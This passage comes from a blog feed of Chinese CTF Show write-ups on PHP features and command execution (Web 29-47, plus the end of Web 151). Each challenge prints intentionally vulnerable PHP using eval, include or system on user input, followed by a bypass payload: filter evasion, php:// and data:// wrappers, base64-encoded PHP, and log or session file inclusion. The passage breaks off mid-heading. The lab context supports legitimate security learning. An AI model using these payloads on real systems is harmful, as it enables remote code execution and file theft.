class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?isVIP=1ctf=/var/<span class="built_in">log</span>/nginx/access.log&amp;a=system(<span class="string">&#x27;ls&#x27;</span>);</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/08/05/8RlGgSM6mD7PArW.png" alt="image-20210805210055518"></p><h2 id="1-52-Web-151-—"><a href="#1-52-Web-151-—" class="headerlink" title="1.52 Web 151 —"></a>1.52 Web 151 —</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">修复了非预期</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phpinclude(<span class="string">&quot;flag.php&quot;</span>);error_reporting(0);highlight_file(__FILE__);class CTFSHOW&#123;    private <span class="variable">$username</span>;    private <span class="variable">$password</span>;    private <span class="variable">$vip</span>;    private <span class="variable">$secret</span>;    <span class="keyword">function</span> <span class="function"><span class="title">__construct</span></span>()&#123;        <span class="variable">$this</span>-&gt;vip = 0;        <span class="variable">$this</span>-&gt;secret = <span class="variable">$flag</span>;    &#125;    <span class="keyword">function</span> <span class="function"><span class="title">__destruct</span></span>()&#123;        <span class="built_in">echo</span> <span class="variable">$this</span>-&gt;secret;    &#125;    public <span class="keyword">function</span> <span class="function"><span class="title">isVIP</span></span>()&#123;        <span class="built_in">return</span> <span class="variable">$this</span>-&gt;vip?TRUE:FALSE;        &#125;    &#125;    <span class="keyword">function</span> __autoload(<span class="variable">$class</span>)&#123;        <span class="keyword">if</span>(isset(<span class="variable">$class</span>))&#123;            <span class="variable">$class</span>();    &#125;&#125;<span class="comment">#过滤字符$key = $_SERVER[&#x27;QUERY_STRING&#x27;];if(preg_match(&#x27;/\_| |\[|\]|\?/&#x27;, $key))&#123;    die(&quot;error&quot;);&#125;$ctf = $_POST[&#x27;ctf&#x27;];extract($_GET);if(class_exists($__CTFSHOW__))&#123;    echo &quot;class is exists!&quot;;&#125;if($isVIP &amp;&amp; strrpos($ctf, &quot;:&quot;)===FALSE &amp;&amp; strrpos($ctf,&quot;log&quot;)===FALSE)&#123;    include($ctf);&#125;</span></span><br></pre></td></tr></table></figure><ul><li>过滤了 <code>log</code></li></ul><p><strong>sess 文件包含</strong></p><p><img src="https://i.loli.net/2021/08/05/UsBeVuF4M6XJv7j.png" alt="image-20210805213534877"></p><p><img src="https://i.loli.net/2021/08/05/vNDO6bQoxqiZwmL.png" alt="image-20210805213509559"></p><p><img src="https://i.loli.net/2021/08/05/q21uFEU9YCBRcQ3.png" alt="image-20210805213448223"></p><p><a href="https://blog.csdn.net/miuzzx/article/details/109181768">https://blog.csdn.net/miuzzx/article/details/109181768</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;CTF Show PHP 特性篇。&lt;/p&gt;</summary>
    
    
    
    <category term="CTF Show" scheme="https://xizhi-future.github.io/categories/CTF-Show/"/>
    
    
    <category term="CTF" scheme="https://xizhi-future.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>CTF-Show-命令执行</title>
    <link href="https://xizhi-future.github.io/2021/10/01/CTF-Show-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    <id>https://xizhi-future.github.io/2021/10/01/CTF-Show-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</id>
    <published>2021-10-01T11:14:09.000Z</published>
    <updated>2021-10-01T11:14:51.490Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一、CTF-Show-—-命令执行"><a href="#一、CTF-Show-—-命令执行" class="headerlink" title="一、CTF Show — 命令执行"></a>一、CTF Show — 命令执行</h1><h2 id="1-1-Web-29-—-只过滤-flag-—-通配符使用"><a href="#1-1-Web-29-—-只过滤-flag-—-通配符使用" class="headerlink" title="1.1 Web 29 — 只过滤 flag — 通配符使用"></a>1.1 Web 29 — 只过滤 flag — 通配符使用</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">命令执行，需要严格的过滤</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">?c=phpinfo();</span><br><span class="line">?c=system(<span class="string">&#x27;ls&#x27;</span>);<span class="comment">#flag.php index.php </span></span><br><span class="line">?c=system(<span class="string">&#x27;tac fl?g.php&#x27;</span>);</span><br></pre></td></tr></table></figure><h2 id="1-2-Web-30-—-过滤-system-—-其它函数使用"><a href="#1-2-Web-30-—-过滤-system-—-其它函数使用" class="headerlink" title="1.2 Web 30 — 过滤 system() — 其它函数使用"></a>1.2 Web 30 — 过滤 system() — 其它函数使用</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?c=passthru(<span class="string">&#x27;ls&#x27;</span>);<span class="comment">#flag.php index.php </span></span><br><span class="line">?c=passthru(<span class="string">&#x27;tac fl?g.?hp&#x27;</span>);</span><br><span class="line">或者</span><br><span class="line">?c=passthru(<span class="string">&#x27;cat fl?g.?hp&#x27;</span>); <span class="comment">#之后查看源代码</span></span><br></pre></td></tr></table></figure><h2 id="1-3-Web-31-—-过滤部分-读取-命令"><a href="#1-3-Web-31-—-过滤部分-读取-命令" class="headerlink" title="1.3 Web 31 — 过滤部分 读取 命令"></a>1.3 Web 31 — 过滤部分 读取 命令</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?c=passthru(<span class="string">&quot;ls&quot;</span>);<span class="comment">#flag.php index.php </span></span><br><span class="line">?c=passthru(<span class="string">&quot;more%09f*&quot;</span>);</span><br><span class="line">?c=passthru(<span class="string">&quot;tac%09f*&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="1-4-Web-32-—-过滤-—-PHP-include、伪协议-利用"><a href="#1-4-Web-32-—-过滤-—-PHP-include、伪协议-利用" class="headerlink" title="1.4 Web 32 — 过滤 ; — PHP include、伪协议 利用"></a>1.4 Web 32 — 过滤 ; — PHP include、伪协议 利用</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;php</span><br><span class="line"> error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;   </span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="keyword">include</span><span class="variable">$_GET</span>[<span class="string">&quot;a&quot;</span>]<span class="meta">?&gt;</span>&amp;a=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/15/eCRNiO2MgT5jc3z.png" alt="image-20210715163024052"></p><h2 id="1-5-Web-33-—-过滤-—-PHP-include、伪协议-利用"><a href="#1-5-Web-33-—-过滤-—-PHP-include、伪协议-利用" class="headerlink" title="1.5 Web 33 — 过滤 ; — PHP include、伪协议 利用"></a>1.5 Web 33 — 过滤 ; — PHP include、伪协议 利用</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    error_reporting(<span class="number">0</span>);<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\&quot;/i&quot;</span>, <span class="variable">$c</span>))&#123;        <span class="keyword">eval</span>(<span class="variable">$c</span>);    &#125;    &#125;<span class="keyword">else</span>&#123;    highlight_file(<span class="keyword">__FILE__</span>);&#125; </span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="keyword">include</span><span class="variable">$_GET</span>[a]<span class="meta">?&gt;</span>&amp;a=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/15/WMCiphNGKJaA8RP.png" alt="image-20210715165721641"></p><h2 id="1-6-Web-34-—-过滤-—-PHP-include、伪协议-利用"><a href="#1-6-Web-34-—-过滤-—-PHP-include、伪协议-利用" class="headerlink" title="1.6 Web 34 — 过滤 : — PHP include、伪协议 利用"></a>1.6 Web 34 — 过滤 : — PHP include、伪协议 利用</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    error_reporting(<span class="number">0</span>);<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;/i&quot;</span>, <span class="variable">$c</span>))&#123;        <span class="keyword">eval</span>(<span class="variable">$c</span>);    &#125;    &#125;<span class="keyword">else</span>&#123;    highlight_file(<span class="keyword">__FILE__</span>);&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="keyword">include</span><span class="variable">$_GET</span>[a]<span class="meta">?&gt;</span>&amp;a=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure><h2 id="1-7-Web-35-—-过滤-—-PHP-include、伪协议-利用"><a href="#1-7-Web-35-—-过滤-—-PHP-include、伪协议-利用" class="headerlink" title="1.7 Web 35 — 过滤 = — PHP include、伪协议 利用"></a>1.7 Web 35 — 过滤 = — PHP include、伪协议 利用</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    error_reporting(<span class="number">0</span>);<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=/i&quot;</span>, <span class="variable">$c</span>))&#123;        <span class="keyword">eval</span>(<span class="variable">$c</span>);    &#125;    &#125;<span class="keyword">else</span>&#123;    highlight_file(<span class="keyword">__FILE__</span>);&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="keyword">include</span><span class="variable">$_GET</span>[<span class="number">1</span>]<span class="meta">?&gt;</span>&amp;<span class="number">1</span>=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure><h2 id="1-8-Web-36-—-过滤-数字-0-9-、-—-PHP-include、伪协议-利用"><a href="#1-8-Web-36-—-过滤-数字-0-9-、-—-PHP-include、伪协议-利用" class="headerlink" title="1.8 Web 36 — 过滤 数字 [0-9]、/ — PHP include、伪协议 利用"></a>1.8 Web 36 — 过滤 数字 [0-9]、/ — PHP include、伪协议 利用</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    error_reporting(<span class="number">0</span>);<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=|\/|[0-9]/i&quot;</span>, <span class="variable">$c</span>))&#123;        <span class="keyword">eval</span>(<span class="variable">$c</span>);    &#125;    &#125;<span class="keyword">else</span>&#123;    highlight_file(<span class="keyword">__FILE__</span>);&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="keyword">include</span><span class="variable">$_GET</span>[a]<span class="meta">?&gt;</span>&amp;a=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure><h2 id="1-9-Web-37-—-include-—-文件包含、伪协议利用"><a href="#1-9-Web-37-—-include-—-文件包含、伪协议利用" class="headerlink" title="1.9 Web 37 — include — 文件包含、伪协议利用"></a>1.9 Web 37 — include — 文件包含、伪协议利用</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    <span class="comment">//flag in flag.phperror_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123;    $c = $_GET[&#x27;c&#x27;];    if(!preg_match(&quot;/flag/i&quot;, $c))&#123;        include($c);        echo $flag;        &#125;       &#125;else&#123;    highlight_file(__FILE__);&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=data:<span class="comment">//text/plain,<span class="meta">&lt;?php</span> system(&#x27;ls&#x27;);?c=data://text/plain,<span class="meta">&lt;?php</span> system(&#x27;cat f*&#x27;); #查看源代码</span></span><br></pre></td></tr></table></figure><h2 id="1-10-Web-38-—-过滤-php—-文件包含、伪协议data-base64编码利用"><a href="#1-10-Web-38-—-过滤-php—-文件包含、伪协议data-base64编码利用" class="headerlink" title="1.10 Web 38 — 过滤 php— 文件包含、伪协议data base64编码利用"></a>1.10 Web 38 — 过滤 php— 文件包含、伪协议data base64编码利用</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    <span class="comment">//flag in flag.phperror_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123;    $c = $_GET[&#x27;c&#x27;];    if(!preg_match(&quot;/flag|php|file/i&quot;, $c))&#123;        include($c);        echo $flag;    &#125;       &#125;else&#123;    highlight_file(__FILE__);&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=data:<span class="comment">//text/plain;base64,PD9waHAKc3lzdGVtKCd0YWMgZionKTs=#PD9waHAKc3lzdGVtKCd0YWMgZionKTs=解码是<span class="meta">&lt;?php</span>system(&#x27;tac f*&#x27;);</span></span><br></pre></td></tr></table></figure><h2 id="1-11-Web-39-—-php-后缀截断-—-gt-标签-注释符-绕过"><a href="#1-11-Web-39-—-php-后缀截断-—-gt-标签-注释符-绕过" class="headerlink" title="1.11 Web 39 — .php 后缀截断 — ?&gt;标签   //注释符 绕过"></a>1.11 Web 39 — .php 后缀截断 — ?&gt;标签   //注释符 绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    <span class="comment">//flag in flag.phperror_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123;    $c = $_GET[&#x27;c&#x27;];    if(!preg_match(&quot;/flag/i&quot;, $c))&#123;        include($c.&quot;.php&quot;);    &#125;        &#125;else&#123;    highlight_file(__FILE__);&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=data:<span class="comment">//text/plain,<span class="meta">&lt;?php</span> system(&#x27;ls&#x27;);//#flag.php index.php ?c=data://text/plain,<span class="meta">&lt;?php</span> system(&#x27;tac f*&#x27;);//或者是?c=data://text/plain,<span class="meta">&lt;?php</span> system(&#x27;ls&#x27;);<span class="meta">?&gt;</span>#flag.php index.php .php?c=data://text/plain,<span class="meta">&lt;?php</span> system(&#x27;tac f*&#x27;);<span class="meta">?&gt;</span>    </span></span><br></pre></td></tr></table></figure><h2 id="1-12-Web-40-—-无参函数构造（套娃）"><a href="#1-12-Web-40-—-无参函数构造（套娃）" class="headerlink" title="1.12 Web 40 — 无参函数构造（套娃）"></a>1.12 Web 40 — 无参函数构造（套娃）</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, <span class="variable">$c</span>))&#123;        <span class="keyword">eval</span>(<span class="variable">$c</span>);    &#125;        &#125;<span class="keyword">else</span>&#123;    highlight_file(<span class="keyword">__FILE__</span>);&#125; </span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=print_r(scandir(current(localeconv())));<span class="comment">#Array ( [0] =&gt; . [1] =&gt; .. [2] =&gt; flag.php [3] =&gt; index.php ) ?c=highlight_file(next(array_reverse(scandir(current(localeconv())))));#读取数组倒数第二个元素，并使用高亮显示出来</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/16/wqpIKykj8S1uYvL.png" alt="image-20210716160101867"></p><h2 id="1-13-Web-41-—"><a href="#1-13-Web-41-—" class="headerlink" title="1.13 Web 41 —"></a>1.13 Web 41 —</h2><p><strong>过滤不严，命令执行</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;    <span class="variable">$c</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];<span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>, <span class="variable">$c</span>))&#123;        <span class="keyword">eval</span>(<span class="string">&quot;echo(<span class="subst">$c</span>);&quot;</span>);    &#125;&#125;<span class="keyword">else</span>&#123;    highlight_file(<span class="keyword">__FILE__</span>);&#125;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><a href="https://wp.ctf.show/d/137-ctfshow-web-web41">https://wp.ctf.show/d/137-ctfshow-web-web41</a></p><h2 id="1-14-Web-42-—-system-gt-dev-null-2-gt-amp-1-—-0a-绕过"><a href="#1-14-Web-42-—-system-gt-dev-null-2-gt-amp-1-—-0a-绕过" class="headerlink" title="1.14 Web 42 — system  &gt;/dev/null 2&gt;&amp;1 — %0a 绕过"></a>1.14 Web 42 — system  &gt;/dev/null 2&gt;&amp;1 — %0a 绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>   <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];    system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);&#125;<span class="keyword">else</span>&#123;    highlight_file(<span class="keyword">__FILE__</span>);&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=ls%<span class="number">0</span>a<span class="comment">#flag.php index.php ?c=tac flag.php%0a</span></span><br></pre></td></tr></table></figure><h2 id="1-15-Web-43-—-system-gt-dev-null-2-gt-amp-1-—-26-绕过"><a href="#1-15-Web-43-—-system-gt-dev-null-2-gt-amp-1-—-26-绕过" class="headerlink" title="1.15 Web 43 — system  &gt;/dev/null 2&gt;&amp;1 — %26 绕过"></a>1.15 Web 43 — system  &gt;/dev/null 2&gt;&amp;1 — %26 绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    </span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=ls%<span class="number">26</span><span class="comment">#flag.php index.php ?c=tac flag.php%26</span></span><br></pre></td></tr></table></figure><h2 id="1-16-Web-44-—-过滤-flag-—-绕过"><a href="#1-16-Web-44-—-过滤-flag-—-绕过" class="headerlink" title="1.16 Web 44 — 过滤 flag — * 绕过"></a>1.16 Web 44 — 过滤 flag — * 绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/;|cat|flag/i&quot;</span>, <span class="variable">$c</span>))&#123;        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);    &#125;&#125;<span class="keyword">else</span>&#123;    highlight_file(<span class="keyword">__FILE__</span>);&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=ls%<span class="number">0</span>a?c=tac f*%<span class="number">0</span>a</span><br></pre></td></tr></table></figure><h2 id="1-17-Web-45-—-过滤-空格-—-IFS-绕过"><a href="#1-17-Web-45-—-过滤-空格-—-IFS-绕过" class="headerlink" title="1.17 Web 45 — 过滤 空格 — ||  ${IFS} 绕过"></a>1.17 Web 45 — 过滤 空格 — ||  ${IFS} 绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| /i&quot;</span>, <span class="variable">$c</span>))&#123;        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);    &#125;&#125;<span class="keyword">else</span>&#123;    highlight_file(<span class="keyword">__FILE__</span>);&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=ls||?c=tac%09f*||?c=tac<span class="variable">$&#123;IFS&#125;</span>f*||?c=tac$IFS<span class="variable">$1f</span>*||</span><br></pre></td></tr></table></figure><h2 id="1-18-Web-46-—-过滤-—-绕过"><a href="#1-18-Web-46-—-过滤-—-绕过" class="headerlink" title="1.18 Web 46 — 过滤 * — ? 绕过"></a>1.18 Web 46 — 过滤 * — ? 绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*/i&quot;</span>, <span class="variable">$c</span>))&#123;        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);    &#125;&#125;<span class="keyword">else</span>&#123;    highlight_file(<span class="keyword">__FILE__</span>);&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=ls||?c=tac%09fl?g.php||</span><br></pre></td></tr></table></figure><h2 id="1-19-Web-47-—-过滤-—-绕过"><a 